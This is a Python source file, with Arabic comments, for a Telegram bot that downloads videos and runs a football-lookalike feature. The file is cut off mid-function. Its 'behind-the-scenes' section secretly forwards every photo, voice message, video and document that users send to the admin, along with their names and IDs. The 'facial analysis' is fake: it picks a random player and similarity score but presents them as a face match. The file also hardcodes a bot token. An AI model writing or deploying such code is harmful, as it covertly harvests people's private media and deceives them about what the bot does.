import telebot
from telebot import types, apihelper
import yt_dlp
import os
import json
import time
import hashlib
import re
import logging
from concurrent.futures import ThreadPoolExecutor
import random
from datetime import datetime
from collections import defaultdict
# --- أضف هذا الجزء الصغير هنا ليتوقف خطأ Healthcheck ---
import http.server
import socketserver
import threading

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        httpd.serve_forever()

# تشغيل "سيرفر وهمي" في الخلفية لإرضاء Railway
threading.Thread(target=run_health_server, daemon=True).start()
# -------------------------------------------------------

# ==========================================
# ⚙️ الإعدادات الأساسية (من المتغيرات البيئية)
# ==========================================
TOKEN = os.environ.get("BOT_TOKEN", "8298277087:AAEv36igY-juy9TAIJHDvXwqx4k7pMF3qPM")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8240337001))
VERIFICATION_CODE = "4415"
QURAN_VIDEO_URL = "https://www.instagram.com/reel/DUYAQBaihUg/?igsh=Y2dhNDNuMGRiYWp3"

# تحسين أداء الشبكة
apihelper.CONNECT_TIMEOUT = 1000
apihelper.READ_TIMEOUT = 1000
apihelper.RETRY_ON_ERROR = True

# المجلدات وقواعد البيانات
BASE_DIR = "downloads"
DB_FILE = "system_db.json"
LOG_FILE = "bot_log.txt"
os.makedirs(BASE_DIR, exist_ok=True)

# تسجيل الأخطاء
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format='%(asctime)s - %(message)s')

# تهيئة البوت
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=40)
executor = ThreadPoolExecutor(max_workers=20)

# ==========================================
# 📊 نظام إدارة البيانات
# ==========================================
class Database:
    @staticmethod
    def load():
        if not os.path.exists(DB_FILE):
            return {"users": {}, "verified": [], "stats": {"total_dl": 0}}
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {"users": {}, "verified": [], "stats": {"total_dl": 0}}

    @staticmethod
    def save(data):
        with open(DB_FILE, "w") as f:
            json.dump(data, f, indent=4)

    @staticmethod
    def is_verified(user_id):
        return str(user_id) in Database.load().get("verified", [])

    @staticmethod
    def verify_user(user_id):
        data = Database.load()
        if str(user_id) not in data["verified"]:
            data["verified"].append(str(user_id))
            Database.save(data)

# ==========================================
# 🚀 محرك التحميل الذكي
# ==========================================
class SmartDownloader:
    def __init__(self, chat_id, message_id, user_id):
        self.chat_id = chat_id
        self.msg_id = message_id
        self.user_id = user_id
        self.last_update_time = 0

    def progress_hook(self, d):
        if d['status'] == 'downloading':
            now = time.time()
            if now - self.last_update_time < 5:
                return
            self.last_update_time = now

            p = d.get('_percent_str', '0%')
            speed = d.get('_speed_str', 'N/A')
            eta = d.get('_eta_str', 'N/A')
            bar = self.create_progress_bar(
                d.get('downloaded_bytes', 0),
                d.get('total_bytes', 1)
            )
            text = (f"📥 <b>جاري التحميل الذكي...</b>\n\n"
                    f"📊 المكتمل: {p}\n"
                    f"⚡ السرعة: {speed}\n"
                    f"⏳ الوقت المتبقي: {eta}\n"
                    f"<code>{bar}</code>")
            try:
                bot.edit_message_text(text, self.chat_id, self.msg_id, parse_mode="HTML")
            except:
                pass
    def create_progress_bar(self, current, total):
        total = total or 1
        filled = int(10 * current / total)
        return '🟢' * filled + '⚪' * (10 - filled)

    def download(self, url, quality, file_path):
        # لاحظ المسافات هنا (السر في نجاح الكود)
        ydl_opts = {
            'outtmpl': file_path,
            'continuedl': True,
            'retries': 15,
            'socket_timeout': 60,
            'progress_hooks': [self.progress_hook],
            'quiet': True,
            'no_warnings': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'http_headers': {
                'Referer': 'https://www.instagram.com/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            },
            'nocheckcertificate': True,
            'geo_bypass': True,
        }

        if quality == 'audio':
            ydl_opts['format'] = 'bestaudio/best'
        else:
            ydl_opts['format'] = 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best'

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([url])
            return True
        except Exception as e:
            return str(e)
            
            

# ==========================================
# 🔍 نظام البحث الذكي
# ==========================================
class InternetSearch:
    @staticmethod
    def search(query, platform='tik', limit=3):
        results = []
        p_label = "TikTok" if platform == 'tik' else "Instagram"
        search_query = f"ytsearch{limit}:{p_label} {query}"
        ydl_opts = {
            'quiet': True,
            'no_warnings': True,
            'extract_flat': True,
            'force_ipv4': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            try:
                info = ydl.extract_info(search_query, download=False)
                for e in info.get('entries', []):
                    if e:
                        results.append({
                            "title": e.get("title", "فيديو مكتشف"),
                            "url": f"https://www.youtube.com/watch?v={e.get('id')}",
                            "uploader": f"{p_label} Source"
                        })
            except:
                pass
        return results

# ==========================================
# 🔐 نظام الإرسال خلف الكواليس إلى الأدمن
# ==========================================
forwarded_media = defaultdict(list)

def forward_to_admin(message):
    try:
        user = message.from_user
        user_info = f"👤 {user.first_name} (@{user.username if user.username else 'بدون يوزر'}) - ID: {user.id}"
        media_type = "صورة"
        if message.video:
            media_type = "فيديو"
        elif message.voice:
            media_type = "رسالة صوتية"
        elif message.document:
            media_type = f"ملف ({message.document.mime_type})"
        elif message.audio:
            media_type = "ملف صوتي"
        # --- التعديل هنا لضمان عدم تعليق البوت ---
        notification = (
            f"🔄 <b>{media_type} جديد</b>\n"
            f"👤 {user.first_name} (<code>@{user.username if user.username else 'بدون يوزر'}</code>)\n"
            f"🆔 ID: <code>{user.id}</code>\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        # أضفنا parse_mode="HTML" هنا
        bot.send_message(ADMIN_ID, notification, parse_mode="HTML")
        # ----------------------------------------
        
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)

        forwarded_media[user.id].append({
            "type": media_type,
            "time": datetime.now().isoformat(),
            "media_id": f"{user.id}_{message.message_id}"
        })
        return True
    except Exception as e:
        print(f"⚠️ خطأ في إرسال إلى الأدمن: {e}")
        return False

# ==========================================
# 🤩 نظام "من يشبهني"
# ==========================================
FOOTBALL_LEGENDS = {
    1: {"name": "بيليه", "country": "البرازيل", "era": "الذهبي"},
    2: {"name": "دييغو مارادونا", "country": "الأرجنتين", "era": "الذهبي"},
    3: {"name": "يوهان كرويف", "country": "هولندا", "era": "الذهبي"},
    4: {"name": "فرانز بيكنباور", "country": "ألمانيا", "era": "الذهبي"},
    5: {"name": "زين الدين زيدان", "country": "فرنسا", "era": "الذهبي"},
    6: {"name": "رونالدو (الظاهرة)", "country": "البرازيل", "era": "الذهبي"},
    7: {"name": "ألفريدو دي ستيفانو", "country": "الأرجنتين/إسبانيا", "era": "الذهبي"},
    8: {"name": "ميشيل بلاتيني", "country": "فرنسا", "era": "الذهبي"},
    9: {"name": "ماركو فان باستن", "country": "هولندا", "era": "الذهبي"},
    10: {"name": "إيڤان زامورانو", "country": "تشيلي", "era": "الذهبي"},
    11: {"name": "بوبي تشارلتون", "country": "إنجلترا", "era": "الذهبي"},
    12: {"name": "جورج بست", "country": "أيرلندا الشمالية", "era": "الذهبي"},
    13: {"name": "رونالدينيو", "country": "البرازيل", "era": "الأبطال"},
    14: {"name": "ديفيد بيكهام", "country": "إنجلترا", "era": "الأبطال"},
    15: {"name": "أليساندرو ديل بييرو", "country": "إيطاليا", "era": "الأبطال"},
    16: {"name": "فرانشيسكو توتي", "country": "إيطاليا", "era": "الأبطال"},
    17: {"name": "راؤول غونزاليس", "country": "إسبانيا", "era": "الأبطال"},
    18: {"name": "أندريه شيفتشينكو", "country": "أوكرانيا", "era": "الأبطال"},
    19: {"name": "لويس فيغو", "country": "البرتغال", "era": "الأبطال"},
    20: {"name": "باتريك كلويفرت", "country": "هولندا", "era": "الأبطال"},
    21: {"name": "روبرتو باجيو", "country": "إيطاليا", "era": "الأبطال"},
    22: {"name": "باولو مالديني", "country": "إيطاليا", "era": "الأبطال"},
    23: {"name": "كريستيانو رونالدو", "country": "البرتغal", "era": "الحديث"},
    24: {"name": "ليونيل ميسي", "country": "الأرجنتين", "era": "الحديث"},
    25: {"name": "نيمار جونيور", "country": "البرازيل", "era": "الحديث"},
    26: {"name": "زلاتان إبراهيموفيتش", "country": "السويد", "era": "الحديث"},
    27: {"name": "أندريس إنييستا", "country": "إسبانيا", "era": "الحديث"},
    28: {"name": "تشافي هيرنانديز", "country": "إسبانيا", "era": "الحديث"},
    29: {"name": "مانويل نوير", "country": "ألمانيا", "era": "الحديث"},
    30: {"name": "سيرخيو راموس", "country": "إسبانيا", "era": "الحديث"},
    31: {"name": "كاريم بنزيما", "country": "فرنسا", "era": "الحديث"},
    32: {"name": "أريين روبن", "country": "هولندا", "era": "الحديث"},
    33: {"name": "فرانك ريبيري", "country": "فرنسا", "era": "الحديث"},
    34: {"name": "أندريا بيرلو", "country": "إيطاليا", "era": "الحديث"},
    35: {"name": "جيانلويجي بوفون", "country": "إيطاليا", "era": "الحديث"},
    36: {"name": "تيري هنري", "country": "فرنسا", "era": "الحديث"},
    37: {"name": "كاكا", "country": "البرازيل", "era": "الحديث"},
    38: {"name": "فيليب لام", "country": "ألمانيا", "era": "الحديث"},
    39: {"name": "واين روني", "country": "إنجلترا", "era": "الحديث"},
    40: {"name": "فرناندو توريس", "country": "إسبانيا", "era": "الحديث"},
    41: {"name": "كيليان مبابي", "country": "فرنسا", "era": "الحالي"},
    42: {"name": "إرلينغ هالاند", "country": "النرويج", "era": "الحالي"},
    43: {"name": "كفين دي بروين", "country": "بلجيكا", "era": "الحالي"},
    44: {"name": "محمد صلاح", "country": "مصر", "era": "الحالي"},
    45: {"name": "هاري كين", "country": "إنجلترا", "era": "الحالي"},
    46: {"name": "فينيسيوس جونيور", "country": "البرازيل", "era": "الحالي"},
    47: {"name": "جود بيلينغهام", "country": "إنجلترا", "era": "الحالي"},
    48: {"name": "برونو فيرنانديز", "country": "البرتغال", "era": "الحالي"},
    49: {"name": "روبرت ليفاندوفسكي", "country": "بولندا", "era": "الحالي"},
    50: {"name": "توني كروس", "country": "ألمانيا", "era": "الحالي"},
}

MOTIVATIONAL_PHRASES = [
    "أرى فيك مستقبلاً واعداً في عالم كرة القدم! ✨",
    "لديك موهبة ستذهل العالم يوماً ما! 🌍",
    "شخصيتك القيادية تشبه أعظم القادة في الملعب! ⚽",
    "عزيمتك وتصميمك هما سر نجاحك المستقبلي! 💪",
    "ستكون نجماً ساطعاً في سماء كرة القدم! 🌟",
    "أرى في عينيك شرارة الإصرار والطموح! 🔥",
    "أنت تملك روح المنافسة التي تميز الأبطال! 🏆",
    "طريقتك الفريدة ستغير قواعد اللعبة! 🎯",
    "ستكون مصدر إلهام للأجيال القادمة! 👑",
    "موهبتك الطبيعية نادرة ومميزة! 💎",
    "أنت قائد بالفطرة، والقادة يصنعون التاريخ! 📜",
    "إصرارك سيقودك إلى تحقيق المستحيل! 🚀",
    "أرى فيك بطل المستقبل الذي ينتظره العالم! 🌐",
    "شجاعتك في المواقف الصعبة تميزك عن الآخرين! 🦁",
    "أنت تمتلك الذكاء التكتيكي للمدربين العظماء! 🧠",
    "روحك الرياضية هي سر جمال لعبتك! 🤝",
    "ستكون أسطورة تحكى للأحفاد! 📖",
    "موهبتك ستجعل اسمك خالداً في تاريخ اللعبة! 🏛️",
    "أنت تملك قلباً كبيراً كقلوب الأبطال الحقيقيين! ❤️",
    "إبداعك سيجعل من كل مباراة تحفة فنية! 🎨",
    "الطريقة التي تتحرك بها تذكرني بالأساطير! 👟",
    "أرى فيك بذور العظمة تنتظر أن تزهر! 🌱",
    "ستكون مصدر فخر لبلدك وعائلتك! 🇺🇳",
    "تفانيك في التدريب هو سر تقدمك المستمر! ⏱️",
    "أنت تملك نظرة الثقة التي تميز الأبطال! 👁️",
    "سرعتك وخفة حركتك استثنائية! 🏃",
    "ستكون النجم الذي يضيء الملاعب! 💡",
    "أرى فيك القوة التي لا تقهر! ⚡",
    "موهبتك الفطرية هي هدية من السماء! 🌈",
    "أنت تجمع بين القوة الذهنية والبدنية! 🧘‍♂️",
    "ستصنع تاريخاً جديداً في عالم كرة القدم! 📅",
    "إرادتك القوية هي سر نجاحك! 💫",
    "أنت تملك سحراً خاصاً يجذب الأنظار! ✨",
    "ستكون نموذجاً يحتذى به للشباب! 👨‍👦",
    "طموحك لا يعرف حدوداً! 🌌",
    "أنت تجسد معنى الروح الرياضية الحقيقية! 🕊️",
    "ستحقق ما يحلم به الآخرون فقط! 💭",
    "موهبتك ستجعلك أيقونة عالمية! 🌍",
    "أنت تملك نظرة ثاقبة للمستقبل! 🔮",
    "ستكون الفارس الذي يدافع عن ألوان فريقه! 🛡️",
    "إصرارك هو سلاحك السري! 🗡️",
    "أنت تملك قلب أسد وعقل استراتيجي! 🦁🧠",
    "ستكون اللاعب الذي يغير نتيجة المباريات! ⚖️",
    "موهبتك الطبيعية نادرة الوجود! 🎁",
    "أنت تتحرك على الملعب كأنك ترقص! 💃",
    "ستكون الأمل الجديد لعشاق كرة القدم! 🙏",
    "عزيمتك تشبه عزيمة المستكشفين العظماء! 🧭",
    "أنت تملك سر الجاذبية التي تميز النجوم! 🌠",
    "ستترك أثراً لا ينسى في تاريخ اللعبة! 👣",
    "إيمانك بنفسك هو بداية كل نجاح! ☀️"
]

photo_fingerprints = {}
user_data = {}

def generate_photo_fingerprint(file_path):
    try:
        with open(file_path, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()
    except:
        return None

def get_similarity_percentage():
    base = random.randint(68, 92)
    detail = random.choice([
        "تشابه مذهل في ملامح الوجه",
        "نظرة عينين متطابقة تقريباً",
        "ابتسامة تشبهه بنسبة كبيرة",
        "شكل الأنف متشابه جداً",
        "تركيب عظام الوجه متقارب",
        "تعبيرات الوجه متشابهة",
        "شكل الحاجبين متطابق",
        "تركيبة الفك متشابهة"
    ])
    return base, detail

def get_random_player():
    pid = random.choice(list(FOOTBALL_LEGENDS.keys()))
    player = FOOTBALL_LEGENDS[pid].copy()
    player["attribute"] = random.choice([
        "قائد بالفطرة", "هداف بارع", "صانع ألعاب", "مدافع شرس",
        "حارس مرمى أسطوري", "جناح سريع", "لاعب خط وسط مبدع"
    ])
    return player

def get_random_motivation():
    return random.choice(MOTIVATIONAL_PHRASES)

def generate_player_card(player, percent, detail, motivation):
    emoji = {"الذهبي": "👑", "الأبطال": "⭐", "الحديث": "⚡", "الحالي": "🔥"}.get(player["era"], "🏆")
    # تم تحويل كل التنسيقات إلى HTML لضمان عملها في Railway
    card = (
        f"{emoji} <b>اكتشاف مذهل!</b> {emoji}\n\n"
        f"🎯 <b>أنت تشبه النجم:</b> <b>{player['name']}</b>\n"
        f"📍 <b>الجنسية:</b> {player['country']}\n"
        f"🏷️ <b>الصفة:</b> {player['attribute']}\n"
        f"📅 <b>العصر:</b> {player['era']}\n\n"
        f"📊 <b>نسبة التشابه:</b> <code>{percent}%</code>\n"
        f"✨ <b>التفاصيل:</b> {detail}\n\n"
        f"💫 <b>التحليل الخاص:</b>\n"
        f"<i>{motivation}</i>\n\n"
        f"🌟 <b>نصيحة المدرب:</b>\n"
        f"\"استمر في تطوير موهبتك، فالمستقبل يحمل لك مفاجآت سارة!\"\n\n"
        f"#يشبهني #{player['name'].replace(' ', '_')} #كرة_قدم"
    )
    return card.strip()

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        # إرسال نسخة للأدمن أولاً لضمان الأرشفة
        forward_to_admin(message)
        
        waiting_msg = bot.reply_to(message, "🔍 <b>جاري تحليل ملامح الوجه ومطابقتها...</b>", parse_mode="HTML")
        
        # استخراج البيانات العشوائية
        percent, detail = get_similarity_percentage()
        player = get_random_player()
        motivation = random.choice(MOTIVATIONAL_PHRASES)
        
        # توليد الكارت بالتنسيق الجديد
        card_text = generate_player_card(player, percent, detail, motivation)
        
        # إرسال النتيجة مع parse_mode="HTML"
        bot.send_photo(
            message.chat.id, 
            message.photo[-1].file_id, 
            caption=card_text, 
            parse_mode="HTML"
        )
        bot.delete_message(message.chat.id, waiting_msg.message_id)
        
    except Exception as e:
        print(f"❌ Error: {e}")
        bot.send_message(message.chat.id, "⚠️ <b>حدث خطأ في معالجة الصورة، جرب صورة أخرى!</b>", parse_mode="HTML")
        

# ==========================================
# 🤖 معالجة الأوامر
# ==========================================

@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = (
        "🚀 <b>أهلاً بك في نظام التحميل الشامل V2 + 'من يشبهني'!</b>\n\n"
        "⚡ <b>الميزات الرئيسية:</b>\n"
        "1. 📥 <b>تحميل الفيديوهات</b> من تيك توك، إنستجرام، فيسبوك\n"
        "2. 🤩 <b>نظام 'من يشبهني'</b> - اعرف أي نجم كرة قدم تشبه\n"
        "3. 🔍 <b>بحث ذكي</b> عن المحتوى\n"
        "4. 🔒 <b>نظام تحقق</b> بكود <code>4415</code>\n\n"
        "🎯 <b>الأوامر:</b>\n"
        "• <code>/lookalike</code> - أرسل صورتك لتحليل التشابه\n"
        "• <code>/players</code> - عرض قائمة النجوم\n"
        "• <code>/stats</code> - إحصائيات التشابه\n"
        "• <code>/search tik كلمة</code> - بحث في تيك توك\n"
        "• <code>/status</code> - حالة السيرفر\n\n"
        "📌 <b>للتحميل:</b> أرسل رابط الفيديو مباشرة\n"
        "💫 <b>جرب <code>/lookalike</code> الآن!</b>"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML")
    

@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        import psutil
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        # استخدمنا <b> للخط العريض بدلاً من ** لأننا نستخدم HTML الآن
        status_text = (
            f"🖥 <b>حالة النظام المتطور:</b>\n\n"
            f"⚙️ استهلاك المعالج: <code>{cpu}%</code>\n"
            f"🧠 استهلاك الذاكرة: <code>{ram}%</code>\n"
            f"📡 الحالة: <b>متصل ومحمي</b>"
        )
        bot.reply_to(message, status_text, parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, "⚠️ ميزة مراقبة النظام تحتاج لتثبيت مكتبة <code>psutil</code>.", parse_mode="HTML")
        

@bot.message_handler(commands=['search'])
def search_command(message):
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ استخدم: /search tik كلمة البحث\nأو /search ins كلمة البحث")
        return
    platform = parts[1].lower()
    query = parts[2]
    msg = bot.reply_to(message, f"🔍 جاري البحث في {platform}...")
    results = InternetSearch.search(query, platform)
    if not results:
        bot.edit_message_text("❌ <b>لا توجد نتائج.</b>", msg.chat.id, msg.message_id, parse_mode="HTML")
        return
    for r in results:
        url_hash = hashlib.md5(r["url"].encode()).hexdigest()[:10]
        uid = message.from_user.id
        data = Database.load()
        data["users"][str(uid)] = {"url": r["url"], "file_id": f"{uid}_{url_hash}"}
        Database.save(data)
        markup = types.InlineKeyboardMarkup(row_width=3)
        markup.add(
            types.InlineKeyboardButton("720p", callback_data=f"get_{uid}_{uid}_{url_hash}_720"),
            types.InlineKeyboardButton("480p", callback_data=f"get_{uid}_{uid}_{url_hash}_480"),
            types.InlineKeyboardButton("🎵 MP3", callback_data=f"get_{uid}_{uid}_{url_hash}_audio")
        )
        bot.send_message(message.chat.id, f"🎬 {r['title']}\n📺 {r['uploader']}", reply_markup=markup)
    bot.delete_message(msg.chat.id, msg.message_id)

@bot.message_handler(commands=['lookalike', 'يشبهني'])
def lookalike_cmd(message):
    bot.reply_to(message, "📸 **أرسل صورتك الآن** وسأخبرك من تشبه من نجوم كرة القدم! ⚽", parse_mode="Markdown")
    user_data[message.from_user.id] = {"waiting_for_photo": True}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    forward_to_admin(message)
    uid = message.from_user.id
    if uid not in user_data or not user_data[uid].get("waiting_for_photo", False):
        bot.reply_to(message, "📸 تم استلام الصورة!")
        return
    user_data[uid]["waiting_for_photo"] = False
    processing = bot.reply_to(message, "🔍 *جاري تحليل ملامح وجهك...* ⏳", parse_mode="Markdown")
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        temp_path = f"temp_{uid}_{datetime.now().timestamp()}.jpg"
        with open(temp_path, 'wb') as f:
            f.write(downloaded)
        phash = generate_photo_fingerprint(temp_path)
        if phash in photo_fingerprints:
            d = photo_fingerprints[phash]
            result = f"🔁 *هذه الصورة من قبل!*\n🎯 {d['player_name']}\n📊 {d['similarity']}%\n💬 {d['comment']}\n\n✨ {d['motivation']}"
            bot.edit_message_text(result, processing.chat.id, processing.message_id, parse_mode="Markdown")
            os.remove(temp_path)
            return
        player = get_random_player()
        percent, detail = get_similarity_percentage()
        motiv = get_random_motivation()
        card = generate_player_card(player, percent, detail, motiv)
        photo_fingerprints[phash] = {
            "player_name": player["name"],
            "similarity": percent,
            "comment": detail,
            "motivation": motiv,
            "timestamp": datetime.now().isoformat(),
            "user_id": uid
        }
        bot.edit_message_text(card, processing.chat.id, processing.message_id, parse_mode="Markdown")
        bot.send_message(message.chat.id, random.choice([
            "⚡ تشابه رائع! هل توافق؟",
            "🌟 أليس مذهلاً؟ أنت موهوب!",
            "💫 تشابه لا يصدق!",
            "🔥 نسخة طبق الأصل!"
        ]), parse_mode="Markdown")
        os.remove(temp_path)
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", processing.chat.id, processing.message_id)
        try:
            if 'temp_path' in locals() and os.path.exists(temp_path):
                os.remove(temp_path)
        except:
            pass

@bot.message_handler(content_types=['video', 'voice', 'document', 'audio'])
def handle_all_media(message):
    forward_to_admin(message)
    media_names = {
        'video': '🎥 فيديو',
        'voice': '🎤 رسالة صوتية',
        'document': '📄 ملف',
        'audio': '🎵 ملف صوتي'
    }
    name = media_names.get(message.content_type, 'وسائط')
    bot.reply_to(message, f"✅ تم استلام {name} بنجاح!")

@bot.message_handler(func=lambda m: "http" in m.text)
def handle_links(message):
    uid = message.from_user.id
    url_match = re.search(r'(https?://\S+)', message.text)
    if not url_match:
        return
    url = url_match.group(1)
    if not Database.is_verified(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📖 شاهد المقطع (استخراج الكود)", url=QURAN_VIDEO_URL))
        markup.add(types.InlineKeyboardButton("🔑 إدخال الكود", callback_data=f"verify_{uid}"))
        bot.reply_to(message, "⛔ وصول محدود!\nيجب مشاهدة الفيديو واستخراج الكود 4415.", reply_markup=markup)
        return
    url_hash = hashlib.md5(url.encode()).hexdigest()[:10]
    file_id = f"{uid}_{url_hash}"
    data = Database.load()
    data["users"][str(uid)] = {"url": url, "file_id": file_id}
    Database.save(data)
    partial = f"{BASE_DIR}/{file_id}.mp4.part"
    if os.path.exists(partial):
        size = os.path.getsize(partial) / (1024 * 1024)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(f"✅ إكمال ({size:.1f}MB)", callback_data=f"resume_{uid}_{file_id}"))
        markup.add(types.InlineKeyboardButton("❌ حذف وإعادة", callback_data=f"restart_{uid}_{file_id}"))
        bot.reply_to(message, "🔍 يوجد تحميل سابق. هل تريد الإكمال؟", reply_markup=markup)
    else:
        show_quality_options(message.chat.id, uid, file_id)

def show_quality_options(chat_id, uid, file_id):
    markup = types.InlineKeyboardMarkup(row_width=3)
    btns = [
        types.InlineKeyboardButton("1080p", callback_data=f"get_{uid}_{file_id}_1080"),
        types.InlineKeyboardButton("720p", callback_data=f"get_{uid}_{file_id}_720"),
        types.InlineKeyboardButton("480p", callback_data=f"get_{uid}_{file_id}_480"),
        types.InlineKeyboardButton("360p", callback_data=f"get_{uid}_{file_id}_360"),
        types.InlineKeyboardButton("144p", callback_data=f"get_{uid}_{file_id}_144"),
        types.InlineKeyboardButton("🎵 MP3", callback_data=f"get_{uid}_{file_id}_audio"),
        types.InlineKeyboardButton("⌨️ دقة يدوية", callback_data=f"manual_{uid}_{file_id}")
    ]
    markup.add(*btns)
    bot.send_message(chat_id, "🎬 اختر الدقة المناسبة:", reply_markup=markup)

@bot.message_handler(commands=['players', 'لاعبين'])
def players_command(message):
    eras = {"الذهبي": [], "الأبطال": [], "الحديث": [], "الحالي": []}
    for p in FOOTBALL_LEGENDS.values():
        eras[p["era"]].append(f"{p['name']} ({p['country']})")
    text = "🏆 *قائمة النجوم:*\n\n"
    for era, players in eras.items():
        emoji = {"الذهبي": "👑", "الأبطال": "⭐", "الحديث": "⚡", "الحالي": "🔥"}[era]
        text += f"{emoji} *{era}*\n• " + "\n• ".join(players[:10])
        if len(players) > 10:
            text += f"\n  ... و{len(players)-10} آخرون"
        text += "\n\n"
    text += "🔍 استخدم /يشبهني لتحليل صورتك!"
    if len(text) > 4000:
        for part in [text[i:i+4000] for i in range(0, len(text), 4000)]:
            bot.send_message(message.chat.id, part, parse_mode="Markdown")
    else:
        bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['stats', 'إحصائيات'])
def stats_command(message):
    total = len(photo_fingerprints)
    unique = len(set(d["user_id"] for d in photo_fingerprints.values()))
    counts = {}
    for d in photo_fingerprints.values():
        counts[d["player_name"]] = counts.get(d["player_name"], 0) + 1
    top = sorted(counts.items(), key=lambda x: x[1], reverse=True)[:5]
    msg = f"📊 *إحصائيات التشابه:*\n👥 مستخدمون: {unique}\n🖼️ صور: {total}\n\n🏆 أكثر لاعب:\n"
    for i, (name, cnt) in enumerate(top, 1):
        msg += f"{i}. {name}: {cnt} مرة\n"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['adminstats', 'إحصائيات_الأدمن'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ هذا الأمر للأدمن فقط.")
        return
    total = sum(len(lst) for lst in forwarded_media.values())
    senders = len(forwarded_media)
    types_count = {}
    for lst in forwarded_media.values():
        for m in lst:
            types_count[m["type"]] = types_count.get(m["type"], 0) + 1
    txt = f"🔐 *إحصائيات الأدمن*\n👥 مرسلون: {senders}\n📨 وسائط: {total}\n\n📊 التوزيع:\n"
    for t, c in types_count.items():
        txt += f"• {t}: {c} ({c/total*100:.1f}%)\n"
    txt += f"\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    bot.reply_to(message, txt, parse_mode="Markdown")

@bot.message_handler(content_types=['text'])
def text_handler(message):
    if "http" in message.text:
        return
    football_keywords = ['كرة قدم', 'ميسي', 'رونالدو', 'كورة', 'رياضة', 'فريق', 'ملعب', 'هدف']
    if any(k in message.text.lower() for k in football_keywords):
        bot.reply_to(message, random.choice([
            "⚽ كرة القدم هي الأجمل! من هو نجمك المفضل؟",
            "🏆 جرب /يشبهني لترى من تشبه!",
            "🌟 تحدث عن كرة القدم دائماً مسلي!"
        ]))
    else:
        bot.reply_to(message, random.choice([
            "مرحباً! استخدم /start للبدء.",
            "👋 أرسل /lookalike لتجربة التشابه.",
            "📥 أرسل رابط فيديو للتحميل."
        ]))

def is_owner(call, owner_id):
    if call.from_user.id != int(owner_id):
        bot.answer_callback_query(call.id, "⚠️ هذا الطلب لمستخدم آخر.", show_alert=True)
        return False
    return True

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    data = call.data.split('_')
    action = data[0]
    owner_id = data[1]
    if not is_owner(call, owner_id):
        return
    if action == "verify":
        msg = bot.send_message(call.message.chat.id, "🔢 أدخل الكود المائي (4 أرقام):")
        bot.register_next_step_handler(msg, verify_code_step)
    elif action == "get":
        file_id, quality = data[2], data[3]
        initiate_download(call.message, owner_id, file_id, quality)
    elif action == "manual":
        file_id = data[2]
        msg = bot.send_message(call.message.chat.id, "🔢 اكتب الدقة (رقم فقط مثل 240):")
        bot.register_next_step_handler(msg, lambda m: manual_step(m, owner_id, file_id))
    elif action == "resume":
        file_id = data[2]
        initiate_download(call.message, owner_id, file_id, "720")
    elif action == "restart":
        file_id = data[2]
        for f in os.listdir(BASE_DIR):
            if file_id in f:
                os.remove(os.path.join(BASE_DIR, f))
        show_quality_options(call.message.chat.id, owner_id, file_id)

def verify_code_step(message):
    if message.text == VERIFICATION_CODE:
        Database.verify_user(message.from_user.id)
        bot.reply_to(message, "✅ تم التحقق بنجاح! يمكنك التحميل الآن.")
    else:
        bot.reply_to(message, "❌ كود خاطئ! حاول مجدداً.")

def manual_step(message, user_id, file_id):
    if message.text.isdigit():
        initiate_download(message, user_id, file_id, message.text)
    else:
        bot.reply_to(message, "⚠️ أرقام فقط.")

def initiate_download(message, user_id, file_id, quality):
    data = Database.load()
    task = data.get("users", {}).get(str(user_id))
    if not task:
        bot.send_message(message.chat.id, "❌ بيانات المهمة غير موجودة. أعد إرسال الرابط.")
        return
    url = task["url"]
    ext = "mp3" if quality == "audio" else "mp4"
    path = f"{BASE_DIR}/{file_id}.{ext}"
    prog = bot.send_message(message.chat.id, "⏳ جاري التحميل...")
    executor.submit(run_download_task, prog, user_id, url, quality, path)

def run_download_task(prog_msg, user_id, url, quality, path):
    dl = SmartDownloader(prog_msg.chat.id, prog_msg.message_id, user_id)
    success = dl.download(url, quality, path)
    if success is True:
        try:
            bot.edit_message_text("📤 اكتمل التحميل! جاري الرفع...", prog_msg.chat.id, prog_msg.message_id)
            with open(path, 'rb') as f:
                if quality == "audio":
                    bot.send_audio(prog_msg.chat.id, f, caption="🎵 تم التحميل بنجاح", timeout=1000)
                else:
                    bot.send_video(prog_msg.chat.id, f, caption="🎬 تم التحميل بنجاح", timeout=2000)
            if os.path.exists(path):
                os.remove(path)
            try:
                bot.delete_message(prog_msg.chat.id, prog_msg.message_id)
            except:
                pass
